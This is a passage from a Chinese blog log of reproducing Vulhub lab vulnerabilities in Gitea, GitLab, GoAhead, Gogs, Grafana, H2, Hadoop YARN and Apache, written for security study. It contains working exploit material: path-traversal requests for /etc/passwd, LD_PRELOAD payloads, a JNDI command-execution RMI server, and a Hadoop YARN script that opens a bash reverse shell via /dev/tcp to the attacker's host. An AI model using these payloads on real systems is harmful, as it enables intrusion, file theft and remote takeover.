GhostScript。</p><p>参考链接：</p><ul><li><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1729&amp;desc=2">https://bugs.chromium.org/p/project-zero/issues/detail?id=1729&amp;desc=2</a></li><li><a href="https://www.anquanke.com/post/id/170255">https://www.anquanke.com/post/id/170255</a></li></ul></blockquote><h2 id="漏洞复现-60"><a href="#漏洞复现-60" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>作者给出了<a href="poc.png">POC</a>，上传这个文件，即可执行<code>id &gt; /tmp/success</code>：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/127.jpg" alt="127"></p><h1 id="Gitea-1-4-0-目录穿越导致命令执行漏洞"><a href="#Gitea-1-4-0-目录穿越导致命令执行漏洞" class="headerlink" title="Gitea 1.4.0 目录穿越导致命令执行漏洞"></a>Gitea 1.4.0 目录穿越导致命令执行漏洞</h1><blockquote><p>Gitea是从gogs衍生出的一个开源项目，是一个类似于Github、Gitlab的多用户Git仓库管理平台。其1.4.0版本中有一处逻辑错误，导致未授权用户可以穿越目录，读写任意文件，最终导致执行任意命令。</p><p>参考链接：</p><ul><li><a href="https://security.szurek.pl/gitea-1-4-0-unauthenticated-rce.html">https://security.szurek.pl/gitea-1-4-0-unauthenticated-rce.html</a></li><li><a href="https://www.leavesongs.com/PENETRATION/gitea-remote-command-execution.html">https://www.leavesongs.com/PENETRATION/gitea-remote-command-execution.html</a></li></ul></blockquote><h2 id="漏洞复现-61"><a href="#漏洞复现-61" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>安装完成后，创建一个公开的仓库，随便添加点文件进去（比如使用选定的文件和模板初始化仓库）：</p><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/128.jpg" alt="128"></p><p>然后，需要执行一次<code>docker compose restart</code>重启gitea服务。（原因详见第二个参考链接）</p></blockquote><blockquote><p>由于漏洞链整体利用比较复杂，我们只复现文件读取部分，剩余利用方法详见第二个参考链接。</p><p>打开gitea，找到刚才创建的公开项目，如<code>vulhub/repo</code>，发送如下数据包，添加一个Git LFS对象：</p><pre class="line-numbers language-none"><code class="language-none">POST /vulhub/repo.git/info/lfs/objects HTTP/1.1Host: your-ip:3000Accept-Encoding: gzip, deflateAccept: application/vnd.git-lfs+jsonAccept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/jsonContent-Length: 151{    "Oid": "....../../../etc/passwd",    "Size": 1000000,    "User" : "a",    "Password" : "a",    "Repo" : "a",    "Authorization" : "a"}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后，访问<code>http://your-ip:3000/vulhub/repo.git/info/lfs/objects/......%2F..%2F..%2Fetc%2Fpasswd/sth</code>，即可看到<code>/etc/passwd</code>已被成功读取：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/129.jpg" alt="129"><br><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/130.jpg" alt="130"></p><h1 id="GitLab-任意文件读取漏洞（CVE-2016-9086）"><a href="#GitLab-任意文件读取漏洞（CVE-2016-9086）" class="headerlink" title="GitLab 任意文件读取漏洞（CVE-2016-9086）"></a>GitLab 任意文件读取漏洞（CVE-2016-9086）</h1><blockquote><p>GitLab是一款Ruby开发的Git项目管理平台。在8.9版本后添加的“导出、导入项目”功能，因为没有处理好压缩包中的软连接，已登录用户可以利用这个功能读取服务器上的任意文件。</p><p>参考链接：</p><ul><li><a href="https://about.gitlab.com/releases/2016/11/02/cve-2016-9086-patches/">https://about.gitlab.com/releases/2016/11/02/cve-2016-9086-patches/</a></li><li><a href="https://hackerone.com/reports/178152">https://hackerone.com/reports/178152</a></li><li><a href="http://paper.seebug.org/104/">http://paper.seebug.org/104/</a></li></ul><p>环境运行后，访问<code>http://your-ip:8080</code>即可查看GitLab主页，其ssh端口为10022，默认管理员账号、密码是<code>root</code>、<code>vulhub123456</code>。</p><blockquote><p>注意，请使用2G及以上内存的VPS或虚拟机运行该环境，实测1G内存的机器无法正常运行GitLab（运行后502错误）。</p></blockquote></blockquote><h2 id="漏洞复现-62"><a href="#漏洞复现-62" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>注册并登录用户，新建一个项目，点击<code>GitLab export</code>：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/131.jpg" alt="131"></p><blockquote><p>在导入页面，将<a href="test.tar.gz">test.tar.gz</a>上传，将会读取到<code>/etc/passwd</code>文件内容：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/132.jpg" alt="132"></p><h1 id="GitLab-远程命令执行漏洞（CVE-2021-22205）"><a href="#GitLab-远程命令执行漏洞（CVE-2021-22205）" class="headerlink" title="GitLab 远程命令执行漏洞（CVE-2021-22205）"></a>GitLab 远程命令执行漏洞（CVE-2021-22205）</h1><blockquote><p>GitLab是一款Ruby开发的Git项目管理平台。在11.9以后的GitLab中，因为使用了图片处理工具ExifTool而受到漏洞<a href="https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html">CVE-2021-22204</a>的影响，攻击者可以通过一个未授权的接口上传一张恶意构造的图片，进而在GitLab服务器上执行任意命令。</p><p>参考链接：</p><ul><li><a href="https://hackerone.com/reports/1154542">https://hackerone.com/reports/1154542</a></li><li><a href="https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html">https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html</a></li><li><a href="https://security.humanativaspa.it/gitlab-ce-cve-2021-22205-in-the-wild/">https://security.humanativaspa.it/gitlab-ce-cve-2021-22205-in-the-wild/</a></li><li><a href="https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-22205.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-22205.yaml</a></li></ul></blockquote><h2 id="漏洞复现-63"><a href="#漏洞复现-63" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>GitLab的/uploads/user接口可以上传图片且无需认证，利用<a href="poc.py">poc.py</a>脚本来测试这个漏洞：</p><pre class="line-numbers language-none"><code class="language-none">&gt;python poc.py http://your-ip:8080 "touch /tmp/success"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/133.jpg" alt="133"></p><blockquote><p>进入容器内，可见<code>touch /tmp/success</code>已成功执行：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/134.jpg" alt="134"></p><h1 id="gitlist-0-6-0-远程命令执行漏洞（CVE-2018-1000533）（未完成）"><a href="#gitlist-0-6-0-远程命令执行漏洞（CVE-2018-1000533）（未完成）" class="headerlink" title="gitlist 0.6.0 远程命令执行漏洞（CVE-2018-1000533）（未完成）"></a>gitlist 0.6.0 远程命令执行漏洞（CVE-2018-1000533）（未完成）</h1><blockquote><p> gitlist是一款使用PHP开发的图形化git仓库查看工具。在其0.6.0版本及以前，存在一处命令参数注入问题，可以导致远程命令执行漏洞。</p><p>参考链接：</p><ul><li><a href="https://github.com/klaussilveira/gitlist/commit/87b8c26b023c3fc37f0796b14bb13710f397b322">https://github.com/klaussilveira/gitlist/commit/87b8c26b023c3fc37f0796b14bb13710f397b322</a></li><li><a href="https://www.exploit-db.com/exploits/44548">https://www.exploit-db.com/exploits/44548</a></li><li><a href="https://www.leavesongs.com/PENETRATION/escapeshellarg-and-parameter-injection.html">https://www.leavesongs.com/PENETRATION/escapeshellarg-and-parameter-injection.html</a></li></ul></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/135.jpg" alt="135"><br>创建环境显示502 </p><h1 id="GlassFish-任意文件读取漏洞"><a href="#GlassFish-任意文件读取漏洞" class="headerlink" title="GlassFish 任意文件读取漏洞"></a>GlassFish 任意文件读取漏洞</h1><blockquote><h2 id="原理-7"><a href="#原理-7" class="headerlink" title="原理"></a>原理</h2><p>参考链接：</p><ul><li><a href="https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2015-016/?fid=6904">https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2015-016/?fid=6904</a></li><li><a href="https://www.leavesongs.com/PENETRATION/utf-8-overlong-encoding.html">https://www.leavesongs.com/PENETRATION/utf-8-overlong-encoding.html</a></li></ul><p>GlassFish在解码URL时，没有考虑UTF-8 Overlong Encoding攻击，导致将<code>%c0%ae</code>解析为ASCCII字符的<code>.</code>（点）。利用<code>%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/</code>来向上跳转，达到目录穿越、任意文件读取的效果。</p></blockquote><h2 id="漏洞复现-64"><a href="#漏洞复现-64" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>环境运行后，访问<code>http://your-ip:8080</code>和<code>http://your-ip:4848</code>即可查看web页面。其中，8080端口是网站内容，4848端口是GlassFish管理中心。</p><p>访问<code>https://your-ip:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd</code>，发现已成功读取<code>/etc/passwd</code>内容：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/136.jpg" alt="136"></p><h1 id="GoAhead-远程命令执行漏洞（CVE-2017-17562）"><a href="#GoAhead-远程命令执行漏洞（CVE-2017-17562）" class="headerlink" title="GoAhead 远程命令执行漏洞（CVE-2017-17562）"></a>GoAhead 远程命令执行漏洞（CVE-2017-17562）</h1><blockquote><p>GoAhead是一个开源(商业许可)、简单、轻巧、功能强大、可以在多个平台运行的Web Server，多用于嵌入式系统、智能设备。其支持运行ASP、Javascript和标准的CGI程序，这个漏洞就出现在运行CGI程序的时候。</p><p>GoAhead在接收到请求后，将会从URL参数中取出键和值注册进CGI程序的环境变量，且只过滤了<code>REMOTE_HOST</code>和<code>HTTP_AUTHORIZATION</code>。我们能够控制环境变量，就有很多攻击方式。比如在Linux中，<code>LD_</code>开头的环境变量和动态链接库有关，如<code>LD_PRELOAD</code>中指定的动态链接库，将会被自动加载；<code>LD_LIBRARY_PATH</code>指定的路径，程序会去其中寻找动态链接库。</p><p>我们可以指定<code>LD_PRELOAD=/proc/self/fd/0</code>，因为<code>/proc/self/fd/0</code>是标准输入，而在CGI程序中，POST数据流即为标准输入流。我们编译一个动态链接库，将其放在POST Body中，发送给<code>http://target/cgi-bin/index?LD_PRELOAD=/proc/self/fd/0</code>，CGI就会加载我们发送的动态链接库，造成远程命令执行漏洞。</p><p>参考链接：</p><ul><li><a href="https://www.elttam.com.au/blog/goahead/">https://www.elttam.com.au/blog/goahead/</a></li></ul></blockquote><h2 id="漏洞复现-65"><a href="#漏洞复现-65" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>我们首先需要编译一个动态链接库，而且需要和目标架构相同。所以在实战中，如果对方是一个智能设备，你可能需要交叉编译。因为Vulhub运行在<code>Linux x86_64</code>的机器中，所以我们直接用Linux PC编译即可。动态链接库源码：</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;unistd.h&gt;static void before_main(void) __attribute__((constructor));static void before_main(void){    write(1, "Hello: World!\n", 14);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样，<code>before_main</code>函数将在程序执行前被调用。编译以上代码：</p><pre class="line-numbers language-none"><code class="language-none">gcc -shared -fPIC ./payload.c -o payload.so<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将payload.so作为post body发送：</p><pre class="line-numbers language-none"><code class="language-none">curl -X POST --data-binary @payload.so "http://your-ip:8080/cgi-bin/index?LD_PRELOAD=/proc/self/fd/0" -i <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可见，<code>Hello: world!</code>已被成功输出，说明我们的动态链接库中的代码已被执行：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/137.jpg" alt="137"></p><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/138.jpg" alt="138"></p><h1 id="GoAhead-Server-环境变量注入（CVE-2021-42342）"><a href="#GoAhead-Server-环境变量注入（CVE-2021-42342）" class="headerlink" title="GoAhead Server 环境变量注入（CVE-2021-42342）"></a>GoAhead Server 环境变量注入（CVE-2021-42342）</h1><blockquote><p>GoAhead是一个开源(商业许可)、简单、轻巧、功能强大、可以在多个平台运行的Web Server，多用于嵌入式系统、智能设备。其支持运行ASP、Javascript和标准的CGI程序。</p><p>这个漏洞是<a href="https://github.com/vulhub/vulhub/tree/master/goahead/CVE-2017-17562">CVE-2017-17562</a>漏洞补丁的绕过，攻击者可以利用该补丁没有考虑到的multipart表单控制目标服务器的环境变量，进而劫持<code>LD_PRELOAD</code>来执行任意代码。</p><p>参考链接：</p><ul><li><a href="https://github.com/vulhub/vulhub/tree/master/goahead/CVE-2017-17562">https://github.com/vulhub/vulhub/tree/master/goahead/CVE-2017-17562</a></li><li><a href="https://ahmed-belkahla.me/post/2-methods-rce-0-day-in-goahead-webserver-pbctf-2021/">https://ahmed-belkahla.me/post/2-methods-rce-0-day-in-goahead-webserver-pbctf-2021/</a></li><li><a href="https://mp.weixin.qq.com/s/AS9DHeHtgqrgjTb2gzLJZg">https://mp.weixin.qq.com/s/AS9DHeHtgqrgjTb2gzLJZg</a></li></ul></blockquote><h2 id="漏洞复现-66"><a href="#漏洞复现-66" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>我们首先需要编译一个动态链接库，而且需要和目标架构相同。所以在实战中，如果对方是一个智能设备，你可能需要交叉编译。因为Vulhub运行在<code>Linux x86_64</code>的机器中，所以我们直接用Linux PC编译即可。动态链接库源码：</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;unistd.h&gt;static void before_main(void) __attribute__((constructor));static void before_main(void){    write(1, "Hello: World\r\n\r\n", 16);    write(1, "Hacked\n", 7);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样，<code>before_main</code>函数将在程序执行前被调用。编译以上代码：</p><pre class="line-numbers language-none"><code class="language-none">gcc -s -shared -fPIC ./payload.c -o payload.so<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后，我们使用<a href="poc.py">这个脚本</a>来发送恶意数据包，复现漏洞：</p><pre class="line-numbers language-none"><code class="language-none">python poc.py http://192.168.0.196:8080/cgi-bin/index payload.so<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可见，我们在动态链接库中编写的劫持代码已经被成功执行：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/139.jpg" alt="139"></p><h1 id="Gogs-任意用户登录漏洞（CVE-2018-18925）-未完成"><a href="#Gogs-任意用户登录漏洞（CVE-2018-18925）-未完成" class="headerlink" title="Gogs 任意用户登录漏洞（CVE-2018-18925）(未完成)"></a>Gogs 任意用户登录漏洞（CVE-2018-18925）(未完成)</h1><blockquote><p>gogs是一款极易搭建的自助Git服务平台，具有易安装、跨平台、轻量级等特点，使用者众多。</p><p>其0.11.66及以前版本中，（go-macaron/session库）没有对sessionid进行校验，攻击者利用恶意sessionid即可读取任意文件，通过控制文件内容来控制session内容，进而登录任意账户。</p><p>参考链接：</p><ul><li><a href="https://github.com/gogs/gogs/issues/5469">https://github.com/gogs/gogs/issues/5469</a></li><li><a href="https://xz.aliyun.com/t/3168">https://xz.aliyun.com/t/3168</a></li><li><a href="https://www.anquanke.com/post/id/163575">https://www.anquanke.com/post/id/163575</a></li></ul></blockquote><h2 id="漏洞复现-67"><a href="#漏洞复现-67" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p> 使用Gob序列化生成session文件：</p><pre class="line-numbers language-go" data-language="go"><code class="language-go">package mainimport (    "bytes"    "encoding/gob"    "encoding/hex"    "fmt"    "io/ioutil"    "os")func EncodeGob(obj map[interface{}]interface{}) ([]byte, error) {    for _, v := range obj {        gob.Register(v)    }    buf := bytes.NewBuffer(nil)    err := gob.NewEncoder(buf).Encode(obj)    return buf.Bytes(), err}func main() {    var uid int64 = 1    obj := map[interface{}]interface{}{"_old_uid": "1", "uid": uid, "uname": "root"}    data, err := EncodeGob(obj)    if err != nil {        fmt.Println(err)    }    err = ioutil.WriteFile("data", data, os.O_CREATE|os.O_WRONLY)    if err != nil {        fmt.Println(err)    }    edata := hex.EncodeToString(data)    fmt.Println(edata)}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后注册一个普通用户账户，创建项目，并在“版本发布”页面上传刚生成的session文件：</p></blockquote><p>最后一步没能成功….<img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/140.jpg" alt="140"></p><h1 id="Grafana-8-x-插件模块目录穿越漏洞（CVE-2021-43798）"><a href="#Grafana-8-x-插件模块目录穿越漏洞（CVE-2021-43798）" class="headerlink" title="Grafana 8.x 插件模块目录穿越漏洞（CVE-2021-43798）"></a>Grafana 8.x 插件模块目录穿越漏洞（CVE-2021-43798）</h1><blockquote><ul><li><p>Grafana是一个开源的度量分析与可视化套件。在2021年12月，推特用户@j0v 发表了他发现的一个0day，攻击者利用这个漏洞可以读取服务器上的任意文件。</p><p>参考链接：</p><ul><li><a href="https://grafana.com/blog/2021/12/07/grafana-8.3.1-8.2.7-8.1.8-and-8.0.7-released-with-high-severity-security-fix/">https://grafana.com/blog/2021/12/07/grafana-8.3.1-8.2.7-8.1.8-and-8.0.7-released-with-high-severity-security-fix/</a></li><li><a href="https://twitter.com/hacker_/status/1467880514489044993">https://twitter.com/hacker_/status/1467880514489044993</a></li><li><a href="https://nosec.org/home/detail/4914.html">https://nosec.org/home/detail/4914.html</a></li><li><a href="https://mp.weixin.qq.com/s/dqJ3F_fStlj78S0qhQ3Ggw">https://mp.weixin.qq.com/s/dqJ3F_fStlj78S0qhQ3Ggw</a></li></ul></li></ul></blockquote><h2 id="漏洞复现-68"><a href="#漏洞复现-68" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>这个漏洞出现在插件模块中，这个模块支持用户访问插件目录下的文件，但因为没有对文件名进行限制，攻击者可以利用<code>../</code>的方式穿越目录，读取到服务器上的任意文件。</p><p>利用这个漏洞前，我们需要先获取到一个已安装的插件id，比如常见的有：</p><pre class="line-numbers language-none"><code class="language-none">alertlistcloudwatchdashlistelasticsearchgraphgraphiteheatmapinfluxdbmysqlopentsdbpluginlistpostgresprometheusstackdrivertabletext<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再发送如下数据包，读取任意文件（你也可以将其中的<code>alertlist</code>换成其他合法的插件id）：</p><pre class="line-numbers language-none"><code class="language-none">GET /public/plugins/alertlist/../../../../../../../../../../../../../etc/passwd HTTP/1.1Host: 192.168.1.112:3000Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36Connection: close<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/141.jpg"></p><h1 id="H2-Database-Console-未授权访问"><a href="#H2-Database-Console-未授权访问" class="headerlink" title="H2 Database Console 未授权访问"></a>H2 Database Console 未授权访问</h1><blockquote><p>H2 database是一款Java内存数据库，多用于单元测试。H2 database自带一个Web管理页面，在Spirng开发中，如果我们设置如下选项，即可允许外部用户访问Web管理页面，且没有鉴权：</p><pre class="line-numbers language-none"><code class="language-none">spring.h2.console.enabled=truespring.h2.console.settings.web-allow-others=true<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>利用这个管理页面，我们可以进行JNDI注入攻击，进而在目标环境下执行任意命令。</p><p>参考链接：</p><ul><li><a href="https://mp.weixin.qq.com/s?__biz=MzI2NTM1MjQ3OA==&amp;mid=2247483658&amp;idx=1&amp;sn=584710da0fbe56c1246755147bcec48e">https://mp.weixin.qq.com/s?__biz=MzI2NTM1MjQ3OA==&amp;mid=2247483658&amp;idx=1&amp;sn=584710da0fbe56c1246755147bcec48e</a></li></ul></blockquote><h2 id="漏洞复现-69"><a href="#漏洞复现-69" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>目标环境是Java 8u252，版本较高，因为上下文是Tomcat环境，我们可以参考《<a href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java">Exploiting JNDI Injections in Java</a>》，使用<code>org.apache.naming.factory.BeanFactory</code>加EL表达式注入的方式来执行任意命令。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">import java.rmi.registry.*;import com.sun.jndi.rmi.registry.*;import javax.naming.*;import org.apache.naming.ResourceRef; public class EvilRMIServerNew {    public static void main(String[] args) throws Exception {        System.out.println("Creating evil RMI registry on port 1097");        Registry registry = LocateRegistry.createRegistry(1097);         //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);        //redefine a setter name for the 'x' property from 'setX' to 'eval', see BeanFactory.getObjectInstance code        ref.add(new StringRefAddr("forceString", "x=eval"));        //expression language to execute 'nslookup jndi.s.artsploit.com', modify /bin/sh to cmd.exe if you target windows        ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','nslookup jndi.s.artsploit.com']).start()\")"));         ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);        registry.bind("Object", referenceWrapper);    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们可以借助这个小工具<a href="https://github.com/JosephTribbianni/JNDI">JNDI</a>简化我们的复现过程。</p><p>首先设置JNDI工具中执行的命令为<code>touch /tmp/success</code>：</p><p>然后启动<code>JNDI-1.0-all.jar</code>，在h2 console页面填入JNDI类名和URL地址：</p></blockquote><p>JNDI似乎是在github下架了 这里搞了个<a href="https://github.com/welk1n/JNDI-Injection-Exploit">替代品</a><br>输入<code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C touch /tmp/success</code>  来生成我们接下来要用的payload</p><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/144.jpg" alt="144"></p><p>访问<code>http://your-ip:8080/h2-console/</code>即可查看h2管理器页面</p><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/142.jpg" alt="142"></p><blockquote><p>其中，<code>javax.naming.InitialContext</code>是JNDI的工厂类，URL是运行JNDI工具监听的RMI地址。</p></blockquote><p>点击connect 虽然会报错 但是已创建文件说明成功运行<br><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/143.jpg" alt="143"></p><h1 id="Hadoop-YARN-ResourceManager-未授权访问结尾-引用"><a href="#Hadoop-YARN-ResourceManager-未授权访问结尾-引用" class="headerlink" title="Hadoop YARN ResourceManager 未授权访问结尾/引用"></a>Hadoop YARN ResourceManager 未授权访问结尾/引用</h1><blockquote><h2 id="原理-8"><a href="#原理-8" class="headerlink" title="原理"></a>原理</h2><p>参考 <a href="http://archive.hack.lu/2016/Wavestone%20-%20Hack.lu%202016%20-%20Hadoop%20safari%20-%20Hunting%20for%20vulnerabilities%20-%20v1.0.pdf">http://archive.hack.lu/2016/Wavestone%20-%20Hack.lu%202016%20-%20Hadoop%20safari%20-%20Hunting%20for%20vulnerabilities%20-%20v1.0.pdf</a></p></blockquote><h2 id="漏洞复现-70"><a href="#漏洞复现-70" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>这个连官方给的线索也不是很多..<br>我参考了<a href="https://blog.csdn.net/Aaron_Miller/article/details/106466256">这个玩意儿</a><br>机子开着监听9999端口 用下面的exp（需要修改一下细节）就能获取root账号的shell了<br><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/146.jpg" alt="146"></p><pre class="line-numbers language-none"><code class="language-none">#!/usr/bin/env pythonimport requeststarget = 'http://192.168.226.140:8088/'lhost = '192.168.226.134' # put your local host ip here, and listen at port 9999url = target + 'ws/v1/cluster/apps/new-application'resp = requests.post(url)app_id = resp.json()['application-id']url = target + 'ws/v1/cluster/apps'data = {    'application-id': app_id,    'application-name': 'get-shell',    'am-container-spec': {        'commands': {            'command': '/bin/bash -i &gt;&amp; /dev/tcp/%s/9999 0&gt;&amp;1' % lhost,        },    },    'application-type': 'YARN',}requests.post(url, json=data)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="Apache-HTTPD-多后缀解析漏洞"><a href="#Apache-HTTPD-多后缀解析漏洞" class="headerlink" title="Apache HTTPD 多后缀解析漏洞"></a>Apache HTTPD 多后缀解析漏洞</h1><blockquote><p>Apache HTTPD 支持一个文件拥有多个后缀，并为不同后缀执行不同的指令。比如，如下配置文件：</p><pre class="line-numbers language-none"><code class="language-none">AddType text/html .htmlAddLanguage zh-CN .cn<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>其给<code>.html</code>后缀增加了media-type，值为<code>text/html</code>；给<code>.cn</code>后缀增加了语言，值为<code>zh-CN</code>。此时，如果用户请求文件<code>index.cn.html</code>，他将返回一个中文的html页面。</p><p>以上就是Apache多后缀的特性。如果运维人员给<code>.php</code>后缀增加了处理器：</p><pre class="line-numbers language-none"><code class="language-none">AddHandler application/x-httpd-php .php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>那么，在有多个后缀的情况下，只要一个文件含有<code>.php</code>后缀的文件即将被识别成PHP文件，没必要是最后一个后缀。利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞。</p></blockquote><h2 id="漏洞复现-71"><a href="#漏洞复现-71" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>环境运行后，访问<code>http://your-ip/uploadfiles/apache.php.jpeg</code>即可发现，phpinfo被执行了，该文件被解析为php脚本。</p><p><code>http://your-ip/index.php</code>中是一个白名单检查文件后缀的上传组件，上传完成后并未重命名。我们可以通过上传文件名为<code>xxx.php.jpg</code>或<code>xxx.php.jpeg</code>的文件，利用Apache解析漏洞进行getshell。</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/147.jpg" alt="147"></p><h1 id="Apache-HTTP-Server-2-4-48-mod-proxy-SSRF漏洞（CVE-2021-40438）-坑"><a href="#Apache-HTTP-Server-2-4-48-mod-proxy-SSRF漏洞（CVE-2021-40438）-坑" class="headerlink" title="Apache HTTP Server 2.4.48 mod_proxy SSRF漏洞（CVE-2021-40438）(坑)"></a>Apache HTTP Server 2.4.48 mod_proxy SSRF漏洞（CVE-2021-40438）(坑)</h1><blockquote><p>Apache HTTP Server是Apache基金会开源的一款流行的HTTP服务器。在其2.4.48及以前的版本中，mod_proxy模块存在一处逻辑错误导致攻击者可以控制反向代理服务器的地址，进而导致SSRF漏洞。</p><p>参考链接：</p><ul><li><a href="https://httpd.apache.org/security/vulnerabilities_24.html">https://httpd.apache.org/security/vulnerabilities_24.html</a></li><li><a href="https://firzen.de/building-a-poc-for-cve-2021-40438">https://firzen.de/building-a-poc-for-cve-2021-40438</a></li><li><a href="https://www.leavesongs.com/PENETRATION/apache-mod-proxy-ssrf-cve-2021-40438.html">https://www.leavesongs.com/PENETRATION/apache-mod-proxy-ssrf-cve-2021-40438.html</a></li></ul></blockquote><h2 id="漏洞复现-72"><a href="#漏洞复现-72" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>HTTP余下的漏洞应该都试不了了 镜像pull老失败….</p><h1 id=""><a href="#" class="headerlink" title=""></a></h1><h2 id="结尾-引用"><a href="#结尾-引用" class="headerlink" title="结尾/引用"></a>结尾/引用</h2><blockquote><p>We are just another visitor in a transient world.</p></blockquote><p>原文大部分内容来自<a href="https://github.com/vulhub/vulhub">vulhub</a>中自带的readme文件 在此非常感谢铺下前路的技术大牛</p></body></html>]]></content>
    
    
